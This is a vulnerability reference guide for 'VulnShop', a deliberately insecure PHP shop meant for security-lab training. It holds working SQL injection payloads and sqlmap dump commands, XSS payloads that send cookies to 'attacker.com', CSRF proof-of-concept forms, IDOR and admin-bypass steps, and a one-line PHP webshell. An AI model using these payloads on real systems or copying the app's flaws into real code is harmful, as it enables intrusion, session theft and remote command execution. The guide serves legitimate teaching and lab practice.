# VulnShop — Vulnerability Reference Guide

> ⚠️ **FOR SECURITY LAB / EDUCATIONAL USE ONLY.**
> Do NOT deploy this application on a public server or production environment.

---

## Setup

### Requirements
- PHP 7.4+ (with mysqli extension)
- MySQL 5.7+ / MariaDB 10+
- Apache or Nginx (XAMPP / WAMP / Laragon works great)

### Installation Steps

1. Place the `vuln-shop/` folder inside your web root (e.g. `htdocs/` for XAMPP)
2. Import the database:
   ```
   mysql -u root -p < vuln-shop/database.sql
   ```
   Or use phpMyAdmin: create a new DB called `vulnshop` and import `database.sql`
3. Edit `includes/db.php` and update credentials if needed:
   ```php
   define('DB_USER', 'root');
   define('DB_PASS', 'your_password');
   ```
4. Visit: `http://localhost/vuln-shop/`

### Default Accounts

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | Admin |
| john     | password  | User  |
| alice    | alice123  | User  |
| bob      | letmein   | User  |
| charlie  | charlie   | User  |

---

## Vulnerability Index

### 1. SQL Injection (SQLi)

#### A. Login Bypass — `login.php`
Raw query: `SELECT * FROM users WHERE username = '$username' AND password = '$password'`

| Payload (username field) | Effect |
|--------------------------|--------|
| `admin'--` | Logs in as admin, ignoring password |
| `' OR '1'='1'--` | Logs in as first user in DB |
| `' OR 1=1 LIMIT 1--` | Same effect |

**Using sqlmap:**
```bash
sqlmap -u "http://localhost/vuln-shop/login.php" \
  --data="username=test&password=test" \
  --dbs --batch
```

#### B. Product Page — `product.php?id=`
Raw query: `SELECT * FROM products WHERE id = $id`

| Payload | Effect |
|---------|--------|
| `1 AND 1=2` | Empty result (blind SQLi test) |
| `1 UNION SELECT 1,2,3,4,5,6,7,8,9--` | Union-based extraction |
| `1 UNION SELECT 1,username,password,email,5,6,7,8,9 FROM users--` | Dump credentials |
| `1 AND SLEEP(5)--` | Time-based blind SQLi |

**Using sqlmap:**
```bash
sqlmap -u "http://localhost/vuln-shop/product.php?id=1" \
  --dbs --tables --dump --batch
```

#### C. Search Page — `search.php?q=`
Raw query: `SELECT ... WHERE name LIKE '%$q%'`

| Payload | Effect |
|---------|--------|
| `%' AND 1=1--` | Always true (all products) |
| `%' UNION SELECT 1,username,password,4,5,6,7,8 FROM users--` | Dump users |
| `%' AND 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 FROM information_schema.tables--` | List tables |

**Using sqlmap:**
```bash
sqlmap -u "http://localhost/vuln-shop/search.php?q=test" \
  -p q --technique=BEUSTQ --dbs --dump --batch
```

#### D. Coupon Code — `checkout.php`
Raw query: `SELECT * FROM coupons WHERE code = '$coupon_code' AND active = 1`

| Payload | Effect |
|---------|--------|
| `' OR active=1 LIMIT 1--` | Gets any active coupon |
| `' OR 1=1--` | Bypasses coupon check |

#### E. Sort Parameter — `index.php?sort=`
Raw ORDER BY injection:
```
index.php?sort=id,(SELECT SLEEP(3))
```

---

### 2. Cross-Site Scripting (XSS)

#### A. Reflected XSS

**Search page — `search.php?q=`**
```
/search.php?q=<script>alert(document.cookie)</script>
/search.php?q=<img src=x onerror=alert(1)>
/search.php?q=<svg onload=alert(1)>
```

**Login error — `login.php`** (via username field)
Enter as username:
```
<script>alert(document.cookie)</script>
```

**Product name in breadcrumb — `product.php`** (if product name stored with XSS payload)

#### B. Stored XSS

**Product Reviews — `product.php` (POST)**
Submit review comment:
```html
<script>alert('Stored XSS in review')</script>
<img src=x onerror="document.location='http://attacker.com/?c='+document.cookie">
<script>fetch('http://attacker.com/?stolen='+document.cookie)</script>
```

**User Profile Bio — `profile.php` / `register.php`**
Set bio to:
```html
<script>alert('XSS in profile bio')</script>
```
Everyone who views your profile will trigger it.

**Contact Form → Admin Panel — `contact.php` → `admin/?section=messages`**
Send message with body:
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```
When admin views Messages tab, XSS fires with admin's session cookie.

**Registration Username**
Register with username:
```html
<b>hacked</b><script>alert(1)</script>
```
Triggers everywhere the username is echoed (navbar, profile, admin users table).

---

### 3. Cross-Site Request Forgery (CSRF)

No CSRF tokens anywhere on the site. All state-changing actions are vulnerable.

#### Cart Add via GET (Image Tag PoC)
```html
<!-- Host on attacker.com — visiting this page adds 99 items to victim's cart -->
<img src="http://localhost/vuln-shop/cart.php?action=add&product_id=1&qty=99">
```

#### Checkout Form CSRF PoC
```html
<form action="http://localhost/vuln-shop/checkout.php" method="POST" id="f">
  <input name="shipping_address" value="Hacker's House">
  <input name="card_number" value="4111111111111111">
  <input name="place_order" value="1">
</form>
<script>document.getElementById('f').submit()</script>
```

#### Password Change CSRF PoC
```html
<form action="http://localhost/vuln-shop/profile.php" method="POST" id="f">
  <input name="user_id" value="2">
  <input name="old_password" value="password">
  <input name="new_password" value="hacked123">
  <input name="change_password" value="1">
</form>
<script>document.getElementById('f').submit()</script>
```

---

### 4. Insecure Direct Object Reference (IDOR)

#### View any user's profile
```
/vuln-shop/profile.php?id=1    ← admin
/vuln-shop/profile.php?id=2    ← john
/vuln-shop/profile.php?id=3    ← alice
```

#### View any order (no ownership check)
```
/vuln-shop/orders.php?id=1
/vuln-shop/orders.php?id=2
```

#### Delete any cart item
```
/vuln-shop/cart.php?action=remove&cart_id=1
```
No check that `cart_id` belongs to the logged-in user.

#### Update another user's profile (POST body manipulation)
Intercept the profile update request with Burp Suite and change:
```
user_id=2   ← changes to victim's ID
bio=<script>alert(1)</script>
```

---

### 5. Broken Access Control

#### Admin Panel Access
The admin panel at `/vuln-shop/admin/` only checks `$_SESSION['role'] === 'admin'`.

**Bypass methods:**
1. **Mass Assignment:** Register with Burp Suite, add `role=admin` to POST body
2. **SQLi login bypass:** Login with username `admin'--`
3. **Session manipulation:** If session file is accessible, modify role value

---

### 6. Sensitive Data Exposure

- All passwords stored in **plain text** (no hashing)
- Admin panel Users tab shows **all passwords in plain text**
- Database credentials hardcoded in `includes/db.php`
- SQL errors shown to users (error messages reveal table/column names)
- Credit card numbers stored in plain text in orders table

**Dump all credentials via SQLi:**
```
/product.php?id=0 UNION SELECT 1,username,password,email,5,6,7,8,9 FROM users--
```

---

### 7. File Upload Vulnerability (Webshell)

`profile.php` accepts any file type for avatar upload with no validation.

**Upload a PHP webshell:**
1. Go to your profile
2. Upload a file named `shell.php` containing:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Access: `http://localhost/vuln-shop/uploads/shell.php?cmd=whoami`

---

### 8. Session Security Issues

- No `session_regenerate_id()` after login → **Session Fixation**
- No `HttpOnly` / `Secure` flags on cookies
- Sessions don't expire → persistent after logout if cookie retained
- Role stored in session — can be manipulated if session is accessible

---

### 9. Username/Password Enumeration

Login error message reveals whether the username exists:
> "Invalid username or password for user: **admin**"

This confirms the username is valid. Use Burp Intruder to enumerate.

---

## Recommended Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept/modify requests, Intruder, Repeater |
| sqlmap | Automated SQL injection exploitation |
| OWASP ZAP | Automated scanning |
| Nikto | Web server vulnerability scanner |
| curl / wget | Manual request crafting |

---

## Vulnerability Map (OWASP Top 10)

| OWASP A# | Vulnerability | Location |
|----------|---------------|----------|
| A01 Broken Access Control | Admin panel bypass, IDOR | admin/, profile.php, orders.php |
| A02 Cryptographic Failures | Plain text passwords, unencrypted card data | users table, orders table |
| A03 Injection | SQL Injection | login, search, product, checkout |
| A04 Insecure Design | No rate limiting, no lockout | login.php |
| A05 Security Misconfiguration | Error messages, debug info | db.php, all pages |
| A06 Vulnerable Components | Outdated jQuery CDN | header.php |
| A07 Auth Failures | Session fixation, no MFA | login.php |
| A08 Integrity Failures | No CSRF tokens | all forms |
| A09 Logging Failures | No logging of failed logins | — |
| A10 SSRF | Not implemented | — |

---

*Happy hacking! Remember: only test on systems you own or have written permission to test.*
